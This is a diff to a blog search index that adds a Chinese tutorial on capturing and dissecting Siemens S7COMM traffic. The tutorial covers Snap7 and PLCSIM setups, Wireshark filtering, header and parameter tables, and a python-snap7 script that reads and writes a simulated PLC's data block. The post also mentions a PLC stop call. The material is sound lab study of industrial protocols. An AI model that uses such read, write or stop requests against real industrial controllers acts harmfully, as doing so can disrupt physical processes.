@@ -1,6 +1,629 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>抓取和分析西门子S7COMM协议</title>
+    <url>/posts/d808b199.html</url>
+    <content><![CDATA[<p>近期在初步入门工控安全，进行了第一次协议分析，本文将介绍如何对 <code>S7COMM</code> 协议进行从零到一的分析。</p>
+<span id="more"></span>
+
+<p>因为是纯小白，加上几乎没人指引，又由于 <code>S7COMM</code> 是西门子的私有协议，本文的编写全靠个人的分析与网上的资料参考，无法保证编写的内容全部准确。</p>
+<h3 id="如何抓取到-S7COMM-协议"><a href="#如何抓取到-S7COMM-协议" class="headerlink" title="如何抓取到 S7COMM 协议"></a>如何抓取到 S7COMM 协议</h3><p>要想对一个协议进行分析，必须先能抓取到该协议。这里我目前尝试了两种方法，第一种是使用 <code>Snap7</code> 模拟器，优点是快捷，方便；第二种是搭建一整套仿真环境，优点是很充分的模拟出真实环境，如果还需要进行除协议外的其他研究，可能需要搭建出一套仿真环境。如果有设备的话，那就更加方便和真实了（不过我没有，所以这种情况就不做记录了）</p>
+<h4 id="使用-Snap7-模拟器抓取S7协议"><a href="#使用-Snap7-模拟器抓取S7协议" class="headerlink" title="使用 Snap7 模拟器抓取S7协议"></a>使用 <code>Snap7</code> 模拟器抓取S7协议</h4><p>关于下载和基本使用的话，这篇 <a href="https://blog.csdn.net/weixin_44112083/article/details/130627005">文章</a> 介绍的很清晰，下面直接介绍用 <code>Wireshark</code> 如何在 <code>Snap7</code> 模拟器上抓取到 <code>S7COMM</code> 流量包</p>
+<p>这里直接写成 <code>0.0.0.0</code> ，然后点 <code>Start</code> 如下</p>
+<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307191007869.png" alt="image-20230719100703797" style="zoom: 80%;" />
+
+
+
+<p>然后这里选择 <code>127.0.0.1</code> ，点击 <code>Connect</code> 如下</p>
+<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307191008419.png" alt="image-20230719100847381" style="zoom:80%;" />
+
+<p><code>Wireshark</code> 中选择这个 <code>Adapter for loopback traffic capture</code> </p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307191010148.png" alt="image-20230719101031104"></p>
+<p>以向 <code>PLC</code> 发出 <code>wirte</code> 请求为例，我们在客户端做如下设置，然后点击 <code>write</code></p>
+<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307191032768.png" alt="image-20230719103232717" style="zoom:80%;" />
+
+
+
+<p>请求发出后，我们用 <code>Wireshark</code> 就能抓取到这个数据包了，这里用 <code>cotp</code> 来过滤一下。这里只介绍协议的抓取，后面再做协议分析</p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307191039851.png" alt="image-20230719103942675"></p>
+<h4 id="在仿真环境抓取S7协议"><a href="#在仿真环境抓取S7协议" class="headerlink" title="在仿真环境抓取S7协议"></a>在仿真环境抓取S7协议</h4><p>具体的搭建环境过程请参考这篇 <a href="https://zhuanlan.zhihu.com/p/304315391">文章</a> ，仿真软件的话我用的是 <code>S7-PLCSIM Advanced v3.0</code>，这里只介绍环境搭建后如何用 <code>Wireshark</code> 抓取到 <code>S7COMM</code> 流量包（如果安装不熟练的话，建议安装在虚拟机里面，笔记本能吃得消的话，内存最好配置成 <code>16G</code> ，不然会很卡 ）</p>
+<p>首先从控制面板里找到更改适配器这里，然后点击以太网的属性（如下）</p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307191738970.png" alt="image-20230719173807624"></p>
+<p>然后点击下面的版本协议</p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307191739563.png" alt="image-20230719173918379"></p>
+<p>然后把 <code>IP</code> 配置成 <code>192.168.0.100</code> （也不是非要跟我这个一样）</p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307191740018.png" alt="image-20230719174001810"></p>
+<p>打开 <code>S7-PLCSIM Advanced v3.0</code> 仿真工具，然后配置就跟图上标注的一样即可，最后点击 <code>Start</code> </p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307191743980.png" alt="image-20230719174308726"></p>
+<p>此时正常效果应该是如下，有个黄色的灯亮了</p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307191747601.png" alt="image-20230719174707349"></p>
+<p>接下来配置博途，点这个创建新项目，项目名称随便取即可，最后点创建</p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307191749803.png" alt="image-20230719174904709"></p>
+<p>点击打开项目视图</p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307191750478.png" alt="image-20230719175012377"></p>
+<p>这里来添加新设备，随便选中一个 <code>1500</code> 型号的 <code>CPU</code> </p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307191751912.png" alt="image-20230719175103790"></p>
+<p>正常的话，应该会出现如下界面，点击红框中的这个地方，来配置<code>PLC</code> 的 <code>IP</code></p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307191752627.png" alt="image-20230719175230535"></p>
+<p>这里的 <code>IP</code> 一定要和仿真工具里面配置的 <code>IP</code> 一样（如下）</p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307191753023.png" alt="image-20230719175341919"></p>
+<p>下面这里需要选中 <strong>允许来自远程对象的 PUT&#x2F;GET通信访问</strong></p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307191755121.png" alt="image-20230719175551017"></p>
+<p>下面创建一个 <code>DB</code> 块</p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307191757599.png" alt="image-20230719175712502"></p>
+<p>然后点击这个 <code>DB</code> 块，写入信息如下图所示（至于变量类型和个数都无所谓，这里只是做一个演示）</p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307191758062.png" alt="image-20230719175829938"></p>
+<p>右键 <code>DB</code> 块，点击属性，然后就能看到下面的配置。把 <strong>优化的块访问</strong> 选项给取消掉</p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307191800125.png" alt="image-20230719180031028"></p>
+<p>项目这里，也就是下图的 <strong>抓取流量测试</strong> 的位置，右键选择属性，在保护这一栏勾选 <strong>块编译时支持仿真</strong> 选项</p>
+<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307200928916.png" alt="image-20230720092822790" style="zoom:80%;" />
+
+
+
+<p>接下来进行编译和下载，依次点击下面的 <strong>编译</strong> 和 <strong>下载到设备</strong> ，选中和图中一样的接口类型和接口（似乎默认就是这样），最后点击开始搜索  </p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307200932452.png" alt="image-20230720093250332"></p>
+<p>如果前面的配置都正确的话，应该会出现下图的状态并且 <strong>下载</strong> 按钮也会亮起来（如果没亮的话，肯定是前面配置错了，大概率是 <code>PLC</code> 的 <code>IP</code> 和仿真工具中的 <code>IP</code> 或者以太网卡的 <code>IP</code> 没有配置好），点击 <strong>下载</strong> 按钮</p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307200935725.png" alt="image-20230720093505604"></p>
+<p>正常的话，应该是要先点一下 <strong>装载</strong>，然后选择 <strong>启动模块</strong> ，点击 <strong>完成</strong>（如果跟下面一样，直接到这个界面的话，就不需要再管装载了，点击完成就行）</p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307200937951.png" alt="image-20230720093750806"></p>
+<p>至此全部完成的话，那么应该和下图一样，从之前的黄灯变成绿灯。</p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307200939562.png" alt="image-20230720093953441"></p>
+<p>并且也是能够直接 <code>ping</code> 通 <code>PLC</code> 的（如下）</p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307200941361.png" alt="image-20230720094130178"></p>
+<p>最后我使用的是 <code>python</code> 中的 <code>snap7</code> 模块，对 <code>PLC</code> 发出读写请求。从而用 <code>Wireshark</code> 抓取通信时的流量，用 <code>S7COMM</code> 来过滤一下，可以发现成功的抓取到了 <code>S7COMM</code> 协议</p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307200944230.png" alt="image-20230720094448068"></p>
+<p>这里我写的脚本代码如下，如果没不太理解函数作用的话，可以阅读一下 <a href="https://python-snap7.readthedocs.io/en/latest/API/client.html?highlight=db_read#">官方文档</a></p>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> snap7</span><br><span class="line"><span class="keyword">from</span> snap7 <span class="keyword">import</span> util</span><br><span class="line">plc = snap7.client.Client()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 连接至PLC</span></span><br><span class="line">plc.connect(<span class="string">&#x27;192.168.0.11&#x27;</span>, <span class="number">0</span>, <span class="number">1</span>)             </span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;连接状态：  <span class="subst">&#123;plc.get_connected()&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取数据</span></span><br><span class="line">recv_data=plc.read_area(snap7.client.Areas.DB,<span class="number">1</span>,<span class="number">0</span>,<span class="number">28</span>)</span><br><span class="line"></span><br><span class="line">list_data=[]</span><br><span class="line">cnt=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">int</span>(<span class="built_in">len</span>(recv_data)),<span class="number">2</span>):</span><br><span class="line">    list_data.append(<span class="built_in">int</span>.from_bytes(recv_data[i:i+<span class="number">2</span>],byteorder=<span class="string">&#x27;big&#x27;</span>))</span><br><span class="line">    cnt=cnt+<span class="number">1</span></span><br><span class="line"></span><br><span class="line">cnt=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> list_data:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;The &#123;&#125; set of data parsed &#123;&#125;&quot;</span>.<span class="built_in">format</span>(cnt,list_data[cnt]))</span><br><span class="line">    cnt=cnt+<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">40</span>)</span><br><span class="line">num=<span class="built_in">bytearray</span>(<span class="number">2</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">14</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;write &#123;&#125; to DB.1 block offset of &#123;&#125;&quot;</span>.<span class="built_in">format</span>(i*<span class="number">4</span>,i*<span class="number">2</span>))</span><br><span class="line">    util.set_int(num,<span class="number">0</span>,i*<span class="number">4</span>)</span><br><span class="line">    plc.db_write(<span class="number">1</span>,i*<span class="number">2</span>,num)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 关闭连接</span></span><br><span class="line"><span class="comment">#plc.disconnect()</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;连接状态：  <span class="subst">&#123;plc.get_connected()&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+<blockquote>
+<p>因为是初学者，有一些问题在上网查过资料后没有找到想要的答案，在下面记录一下（希望有明白的朋友能告知一下）</p>
+<ol>
+<li>配置的 <code>PLC</code> 是 <code>S7-1500</code> ，为什么发出读写请求抓到的是 <code>S7COMM</code> 协议，而不是 <code>S7 COMM PLUS</code> 协议</li>
+<li>除了用 <code>python</code> 脚本直接对 <code>PLC</code> 发出请求之外，还有哪些方式能抓取到与 <code>PLC</code> 通信的流量（我发现在 <code>TIA</code> 中的上传和下载也有通信的流量）</li>
+<li><code>python-snap7</code> 给出了 <code>plc_stop()</code> 函数，该函数可以直接向 <code>PLC</code> 发出关机请求，我使用了之后发现没有用，是哪里进行了阻止呢？或者是仿真环境无法实现的原因？</li>
+</ol>
+</blockquote>
+<h3 id="S7COMM协议分析"><a href="#S7COMM协议分析" class="headerlink" title="S7COMM协议分析"></a>S7COMM协议分析</h3><table>
+<thead>
+<tr>
+<th>ISO-OSI参考模型</th>
+<th>S7以太网协议模型</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>7-应用层</td>
+<td>6-S7 Communication</td>
+</tr>
+<tr>
+<td>6-表示层</td>
+<td>S7 communication(COTP)</td>
+</tr>
+<tr>
+<td>5-会话层</td>
+<td>S7 communication(TPKT)</td>
+</tr>
+<tr>
+<td>4-传输层</td>
+<td>3-TCP(102端口)</td>
+</tr>
+<tr>
+<td>3-网络层</td>
+<td>IP</td>
+</tr>
+<tr>
+<td>2-数据链路层</td>
+<td>1-工业以太网</td>
+</tr>
+<tr>
+<td>1-物理层</td>
+<td></td>
+</tr>
+</tbody></table>
+<p>这里我用 <code>Snap7</code> 模拟器来抓取一个 <code>S7COMM</code> 的流量进行分析，先介绍一下 <code>Snap7</code> 客户端中的 <code>Area</code> <code>DB Number</code> <code>Start</code> <code>Amount</code> <code>WordLen</code> 这五部分（如下图）</p>
+<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307201000439.png" alt="image-20230720100018356" style="zoom: 67%;" />
+
+
+
+<ol>
+<li><p><code>Area</code> 表示数据区域类型，常见区域如下</p>
+<table>
+<thead>
+<tr>
+<th>Hex</th>
+<th>Value</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>0x03</td>
+<td>System info of 200 family</td>
+<td>200系列系统信息</td>
+</tr>
+<tr>
+<td>0x05</td>
+<td>System flags of 200 family</td>
+<td>200系列系统标志</td>
+</tr>
+<tr>
+<td>0x06</td>
+<td>Analog inputs of 200 family</td>
+<td>200系列模拟量输入</td>
+</tr>
+<tr>
+<td>0x07</td>
+<td>Analog outputs of 200 family</td>
+<td>200系列模拟量输出</td>
+</tr>
+<tr>
+<td>0x80</td>
+<td>Direct peripheral access (P)</td>
+<td>直接访问外设</td>
+</tr>
+<tr>
+<td>0x81</td>
+<td>Inputs (I)</td>
+<td>输入（I）</td>
+</tr>
+<tr>
+<td>0x82</td>
+<td>Outputs (Q)</td>
+<td>输出（Q）</td>
+</tr>
+<tr>
+<td>0x83</td>
+<td>Flags (M)</td>
+<td>内部标志（M）</td>
+</tr>
+<tr>
+<td>0x84</td>
+<td>Data blocks (DB)</td>
+<td>数据块（DB）</td>
+</tr>
+<tr>
+<td>0x85</td>
+<td>Instance data blocks (DI)</td>
+<td>背景数据块（DI）</td>
+</tr>
+<tr>
+<td>0x86</td>
+<td>Local data (L)</td>
+<td>局部变量（L）</td>
+</tr>
+<tr>
+<td>0x87</td>
+<td>Unknown yet (V)</td>
+<td>全局变量（V）</td>
+</tr>
+<tr>
+<td>0x1c</td>
+<td>S7 counters (C)</td>
+<td>S7计数器（C）</td>
+</tr>
+<tr>
+<td>0x1d</td>
+<td>S7 timers (T)</td>
+<td>S7定时器（T）</td>
+</tr>
+<tr>
+<td>0x1e</td>
+<td>IEC counters (200 family)</td>
+<td>IEC计数器（200系列）</td>
+</tr>
+<tr>
+<td>0x1f</td>
+<td>IEC timers (200 family)</td>
+<td>IEC定时器（200系列）</td>
+</tr>
+</tbody></table>
+</li>
+<li><p><code>DB Number</code> 代表数据块编号，如果访问的不是数据库则该位置为 <code>0</code></p>
+</li>
+<li><p><code>Start</code> 表示从指定数据块的起始位置写入数据，<code>Start</code> 为 <code>4</code> ，那么则会从编号为 <code>4</code>（第五个字节处）开始写入或读出数据</p>
+</li>
+<li><p><code>Amount</code> 表示写入或读出的数据量（这单位不一定是字节，取决于 <code>WordLen</code> 字段的类型）</p>
+</li>
+<li><p><code>WordLen</code> 表示单位长度，可以选择 <code>Byte</code> <code>Word</code> <code>DWord</code> 等等</p>
+</li>
+</ol>
+<p>接下来点击 <code>Write</code> ，此时抓取一个 <code>S7COMM</code> 的报文</p>
+<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307111556216.png" alt="image-20230711155651147" style="zoom: 80%;" />
+
+
+
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307111603513.png" alt="image-20230711160356351"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">S7 Communication</span><br><span class="line">    Header: (Job)</span><br><span class="line">        Protocol Id: 0x32</span><br><span class="line">        ROSCTR: Job (1)</span><br><span class="line">        Redundancy Identification (Reserved): 0x0000</span><br><span class="line">        Protocol Data Unit Reference: 1792</span><br><span class="line">        Parameter length: 14</span><br><span class="line">        Data length: 44</span><br><span class="line">    Parameter: (Write Var)</span><br><span class="line">        Function: Write Var (0x05)</span><br><span class="line">        Item count: 1</span><br><span class="line">        Item [1]: (DB 1.DBX 4.0 WORD 20)</span><br><span class="line">            Variable specification: 0x12</span><br><span class="line">            Length of following address specification: 10</span><br><span class="line">            Syntax Id: S7ANY (0x10)</span><br><span class="line">            Transport size: WORD (4)</span><br><span class="line">            Length: 20</span><br><span class="line">            DB number: 1</span><br><span class="line">            Area: Data blocks (DB) (0x84)</span><br><span class="line">            Address: 0x000020</span><br><span class="line">                .... .000 0000 0000 0010 0... = Byte Address: 4</span><br><span class="line">                .... .... .... .... .... .000 = Bit Address: 0</span><br><span class="line">    Data</span><br><span class="line">        Item [1]: (Reserved)</span><br><span class="line">            Return code: Reserved (0x00)</span><br><span class="line">            Transport size: BYTE/WORD/DWORD (0x04)</span><br><span class="line">            Length: 40</span><br><span class="line">            Data: 010366778899000011000000000000000000000000000000000000ff0000000000000000…</span><br></pre></td></tr></table></figure>
+
+<p><code>S7COMM</code> 的完整数据如上，下面针对 <code>Header</code> <code>Parameter</code> <code>Data</code> 三部分的各个字段分别做出解释</p>
+<h4 id="Header"><a href="#Header" class="headerlink" title="Header"></a>Header</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">S7 Communication</span><br><span class="line">    Header: (Job)</span><br><span class="line">        Protocol Id: 0x32</span><br><span class="line">        ROSCTR: Job (1)</span><br><span class="line">        Redundancy Identification (Reserved): 0x0000</span><br><span class="line">        Protocol Data Unit Reference: 1792</span><br><span class="line">        Parameter length: 14</span><br><span class="line">        Data length: 44</span><br></pre></td></tr></table></figure>
+
+<p> <code>Protocol Id</code> 为协议 <code>ID</code> ，属于常量为 <code>0x32</code></p>
+<p><code>ROSCTR</code> 表示 <code>PDU</code> （协议数据单元）的类型，有以下值</p>
+<table>
+<thead>
+<tr>
+<th>值</th>
+<th>类型</th>
+<th>解释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>0x01</td>
+<td>Job</td>
+<td>主站发送的作业请求（例如读&#x2F;写存储器，读&#x2F;写块，启&#x2F;停设备，通信设置）</td>
+</tr>
+<tr>
+<td>0x02</td>
+<td>Ack</td>
+<td>没有数据字段的简单确认</td>
+</tr>
+<tr>
+<td>0x03</td>
+<td>Ack_Data</td>
+<td>带有数据字段的应答，一般来响应 <code>Job</code> 请求</td>
+</tr>
+<tr>
+<td>0x07</td>
+<td>Userdata</td>
+<td>扩展协议，其参数字段包含请求&#x2F;响应ID，一般用于编程&#x2F;调试、读取SZL</td>
+</tr>
+</tbody></table>
+<p><code>Redundancy Identification (Reserved)</code>  :  冗余数据，通常为 <code>0x0000</code> </p>
+<p><code>Protocol Data Unit Reference</code>  :  确保通信中每个 <code>PDU</code> 都有唯一的标识，发送方会为每个发送的 <code>PDU</code> 分配一个独立的协议数据单元参考值。接收方在接收到PDU时会检查该字段，以确认该<code> PDU</code> 是否是之前接收过的重复 <code>PDU</code> ，或者是一个新的 <code>PDU</code>   <strong><code>Job</code> 报文和 <code>Ack_Data</code> 报文的<code>protocol data unit reference</code> 值是一样的，个人猜测是为了确保 <code>Ack_Data</code> 是对应于特定的 <code>Job</code> 报文相应</strong> </p>
+<p><code>Parameter length</code>  ：参数 <code>Parameter</code> 字段的长度</p>
+<p><code>Data length</code>  ：数据 <code>Data</code> 字段的长度</p>
+<p><code>Error class</code>  ：仅存在于 <strong>Ack-Data</strong> 报文中，可能的错误常量查看<a href="http://gmiru.com/resources/s7proto/constants.txt">协议常量</a></p>
+<p><code>Error code</code>  ：仅存在于 <strong>Ack-Data</strong> 报文中，可能的错误常量查看<a href="http://gmiru.com/resources/s7proto/constants.txt">协议常量</a></p>
+<h4 id="Parameter"><a href="#Parameter" class="headerlink" title="Parameter"></a>Parameter</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Parameter: (Write Var)</span><br><span class="line">    Function: Write Var (0x05)</span><br><span class="line">    Item count: 1</span><br><span class="line">    Item [1]: (DB 1.DBX 4.0 WORD 20)</span><br><span class="line">        Variable specification: 0x12</span><br><span class="line">        Length of following address specification: 10</span><br><span class="line">        Syntax Id: S7ANY (0x10)</span><br><span class="line">        Transport size: WORD (4)</span><br><span class="line">        Length: 20</span><br><span class="line">        DB number: 1</span><br><span class="line">        Area: Data blocks (DB) (0x84)</span><br><span class="line">        Address: 0x000020</span><br><span class="line">            .... .000 0000 0000 0010 0... = Byte Address: 4</span><br><span class="line">            .... .... .... .... .... .000 = Bit Address: 0</span><br></pre></td></tr></table></figure>
+
+<p>上面 <code>Header</code> 部分提到了 <code>Parameter</code> 字段的长度为 <code>14</code> ，通过下图观察，得以验证</p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307111643863.png" alt="image-20230711164349761"></p>
+<p><code>Function</code>  ：功能码，当 <code>PDU</code> 类型为 <code>Job</code> 或者 <code>Ack_Data</code> 类型时常见的功能码如下：</p>
+<table>
+<thead>
+<tr>
+<th>Hex</th>
+<th>Value</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>0x00</td>
+<td>CPU services</td>
+<td>CPU服务</td>
+</tr>
+<tr>
+<td>0xf0</td>
+<td>Setup communication</td>
+<td>建立通信</td>
+</tr>
+<tr>
+<td>0x04</td>
+<td>Read Var</td>
+<td>读取值</td>
+</tr>
+<tr>
+<td>0x05</td>
+<td>Write Var</td>
+<td>写入值</td>
+</tr>
+<tr>
+<td>0x1a</td>
+<td>Request download</td>
+<td>请求下载</td>
+</tr>
+<tr>
+<td>0x1b</td>
+<td>Download block</td>
+<td>下载块</td>
+</tr>
+<tr>
+<td>0x1c</td>
+<td>Download ended</td>
+<td>下载结束</td>
+</tr>
+<tr>
+<td>0x1d</td>
+<td>Start upload</td>
+<td>开始上传</td>
+</tr>
+<tr>
+<td>0x1e</td>
+<td>Upload</td>
+<td>上传</td>
+</tr>
+<tr>
+<td>0x1f</td>
+<td>End upload</td>
+<td>上传结束</td>
+</tr>
+<tr>
+<td>0x28</td>
+<td>PI-Service</td>
+<td>程序调用服务</td>
+</tr>
+<tr>
+<td>0x29</td>
+<td>PLC Stop</td>
+<td>关闭PLC</td>
+</tr>
+</tbody></table>
+<p><code>Item count</code>  ：表示一个请求中包含的数据项 <code>Item</code> 的数量</p>
+<p><code>Item</code>  ：数据项，<code>Item [1]</code> 表示第一个数据项。它描述了要操作的数据的详细信息，包括数据类型、长度和位置等。</p>
+<p><code>Item</code> 结构又包含如下字段：</p>
+<p><code>Variable specification</code>  ：变量规范字段，一般为 <code>0x12</code></p>
+<p><code>Length of following address specification</code>  ：地址规范长度，主要是以此往后的地址长度（通过下面这个图看的可能比较直观）</p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307111719582.png" alt="image-20230711171959489"></p>
+<p><code>Syntax Id</code>  ：为 <code>IDS</code> 的地址规范格式类型，主要用来确定寻址模式。常见值如下</p>
+<table>
+<thead>
+<tr>
+<th>Hex</th>
+<th>值</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>0x10</td>
+<td>S7ANY</td>
+<td>Address data S7-Any pointer-like DB1.DBX10.2</td>
+</tr>
+<tr>
+<td>0x13</td>
+<td>PBC-R_ID</td>
+<td>R_ID for PBC</td>
+</tr>
+<tr>
+<td>0x15</td>
+<td>ALARM_LOCKFREE</td>
+<td>Alarm lock&#x2F;free dataset</td>
+</tr>
+<tr>
+<td>0x16</td>
+<td>ALARM_IND</td>
+<td>Alarm indication dataset</td>
+</tr>
+<tr>
+<td>0x19</td>
+<td>ALARM_ACK</td>
+<td>Alarm acknowledge message dataset</td>
+</tr>
+<tr>
+<td>0x1a</td>
+<td>ALARM_QUERYREQ</td>
+<td>Alarm query request dataset</td>
+</tr>
+<tr>
+<td>0x1c</td>
+<td>NOTIFY_IND</td>
+<td>Notify indication dataset</td>
+</tr>
+<tr>
+<td>0xa2</td>
+<td>DRIVEESANY</td>
+<td>seen on Drive ES Starter with routing over S7</td>
+</tr>
+<tr>
+<td>0xb2</td>
+<td>1200SYM</td>
+<td>Symbolic address mode of S7-1200</td>
+</tr>
+<tr>
+<td>0xb0</td>
+<td>DBREAD</td>
+<td>Kind of DB block read, seen only at an S7-400</td>
+</tr>
+<tr>
+<td>0x82</td>
+<td>NCK</td>
+<td>Sinumerik NCK HMI access</td>
+</tr>
+</tbody></table>
+<p><code>Transport size</code>  ：指的是数据传输的大小或类型，它用于定义在进行数据交换时所使用的数据单元大小。</p>
+<table>
+<thead>
+<tr>
+<th align="left">Hex</th>
+<th align="left">值</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">2</td>
+<td align="left">BYTE</td>
+</tr>
+<tr>
+<td align="left">3</td>
+<td align="left">CHAR</td>
+</tr>
+<tr>
+<td align="left">4</td>
+<td align="left">WORD</td>
+</tr>
+<tr>
+<td align="left">5</td>
+<td align="left">INT</td>
+</tr>
+<tr>
+<td align="left">6</td>
+<td align="left">DWORD</td>
+</tr>
+<tr>
+<td align="left">7</td>
+<td align="left">DINT</td>
+</tr>
+<tr>
+<td align="left">8</td>
+<td align="left">REAL</td>
+</tr>
+</tbody></table>
+<p><code>Length</code> 指的是写&#x2F;读 数据的长度，就是模拟器中的 <code>Amount</code> 字段</p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307131035340.png" alt="image-20230713103518022"></p>
+<p><code>DB number</code>  ： DB块编号，如果访问的不是DB区域，此处为0x0000</p>
+<p><code>Area</code>  ：代表要操作的区域类型，如下表</p>
+<table>
+<thead>
+<tr>
+<th>Hex</th>
+<th>Value</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>0x03</td>
+<td>System info of 200 family</td>
+<td>200系列系统信息</td>
+</tr>
+<tr>
+<td>0x05</td>
+<td>System flags of 200 family</td>
+<td>200系列系统标志</td>
+</tr>
+<tr>
+<td>0x06</td>
+<td>Analog inputs of 200 family</td>
+<td>200系列模拟量输入</td>
+</tr>
+<tr>
+<td>0x07</td>
+<td>Analog outputs of 200 family</td>
+<td>200系列模拟量输出</td>
+</tr>
+<tr>
+<td>0x80</td>
+<td>Direct peripheral access (P)</td>
+<td>直接访问外设</td>
+</tr>
+<tr>
+<td>0x81</td>
+<td>Inputs (I)</td>
+<td>输入（I）</td>
+</tr>
+<tr>
+<td>0x82</td>
+<td>Outputs (Q)</td>
+<td>输出（Q）</td>
+</tr>
+<tr>
+<td>0x83</td>
+<td>Flags (M)</td>
+<td>内部标志（M）</td>
+</tr>
+<tr>
+<td>0x84</td>
+<td>Data blocks (DB)</td>
+<td>数据块（DB）</td>
+</tr>
+<tr>
+<td>0x85</td>
+<td>Instance data blocks (DI)</td>
+<td>背景数据块（DI）</td>
+</tr>
+<tr>
+<td>0x86</td>
+<td>Local data (L)</td>
+<td>局部变量（L）</td>
+</tr>
+<tr>
+<td>0x87</td>
+<td>Unknown yet (V)</td>
+<td>全局变量（V）</td>
+</tr>
+<tr>
+<td>0x1c</td>
+<td>S7 counters (C)</td>
+<td>S7计数器（C）</td>
+</tr>
+<tr>
+<td>0x1d</td>
+<td>S7 timers (T)</td>
+<td>S7定时器（T）</td>
+</tr>
+<tr>
+<td>0x1e</td>
+<td>IEC counters (200 family)</td>
+<td>IEC计数器（200系列）</td>
+</tr>
+<tr>
+<td>0x1f</td>
+<td>IEC timers (200 family)</td>
+<td>IEC定时器（200系列）</td>
+</tr>
+</tbody></table>
+<h4 id="Data"><a href="#Data" class="headerlink" title="Data"></a>Data</h4><pre><code>Data
+    Item [1]: (Reserved)
+        Return code: Reserved (0x00)
+        Transport size: BYTE/WORD/DWORD (0x04)
+        Length: 40
+        Data: 010366778899000011000000000000000000000000000000000000ff0000000000000000…
+</code></pre>
+<p>因为 <code>Wirte</code> 操作要写入值，所以它比 <code>Read</code> 操作多一个 <code>Data</code> 部分。</p>
+<p><code>return code</code> ：返回码，用来标识 <code>job</code> 操作后的结果（这里的 <code>Return code</code> 是 <code>0x00</code> ，因为这里截取的是请求报文，它对应的响应报文中的 <code>return code</code> 字段是 <code>0xff</code>）</p>
+<table>
+<thead>
+<tr>
+<th>Hex</th>
+<th>值</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>0x00</td>
+<td>Reserved</td>
+<td>未定义，预留</td>
+</tr>
+<tr>
+<td>0x01</td>
+<td>Hardware error</td>
+<td>硬件错误</td>
+</tr>
+<tr>
+<td>0x03</td>
+<td>Accessing the object not allowed</td>
+<td>对象不允许访问</td>
+</tr>
+<tr>
+<td>0x05</td>
+<td>Invalid address</td>
+<td>无效地址，所需的地址超出此PLC的极限</td>
+</tr>
+<tr>
+<td>0x06</td>
+<td>Data type not supported</td>
+<td>数据类型不支持</td>
+</tr>
+<tr>
+<td>0x07</td>
+<td>Data type inconsistent</td>
+<td>日期类型不一致</td>
+</tr>
+<tr>
+<td>0x0a</td>
+<td>Object does not exist</td>
+<td>对象不存在</td>
+</tr>
